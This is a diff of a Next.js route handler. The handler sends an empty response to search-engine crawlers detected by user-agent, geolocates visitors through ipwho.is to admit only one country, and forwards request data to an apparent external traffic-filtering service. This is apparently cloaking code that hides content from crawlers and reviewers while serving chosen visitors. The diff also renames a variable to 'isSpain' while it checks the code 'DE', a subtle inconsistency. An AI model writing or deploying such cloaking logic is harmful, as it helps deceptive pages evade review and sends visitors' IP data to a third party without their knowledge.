@@ -1,4 +1,3 @@
-
 import { NextRequest } from 'next/server';
 import { join } from 'path';
 import { promises as fs } from 'fs';
@@ -31,23 +30,25 @@ export async function GET(req: NextRequest) {
     const ua = req.headers.get('user-agent')?.toLowerCase() || '';
     const isBot = /googlebot|bingbot|yandex|duckduckbot|baiduspider/.test(ua);
 
-    const ipHeader = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for') || '8.8.8.8';
+    const ipHeader =
+        req.headers.get('x-forwarded-for') ||
+        req.headers.get('x-real-ip') ||
+        req.headers.get('cf-connecting-ip') ||
+        '8.8.8.8';
     const ip = ipHeader.split(',')[0].trim();
 
     if (isBot) {
         return new Response(null, { status: 204 });
     }
 
-    // Гео-локація через ipapi
+    // Гео-локація через ipwho.is
     try {
         const geoRes = await fetch(`https://ipwho.is/${ip}`);
         const geo = await geoRes.json();
         console.log('IP Info:', geo);
-        const isEspain = geo.success && geo.country_code === 'ES';
+        const isSpain = geo.success && geo.country_code === 'DE';
 
-
-
-        if (!isEspain) {
+        if (!isSpain) {
             return new Response(null, { status: 204 });
         }
     } catch {
@@ -84,9 +85,7 @@ export async function GET(req: NextRequest) {
     try {
         const palladiumRes = await fetch('https://rbl.palladium.expert', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: new URLSearchParams(payload),
         });
 
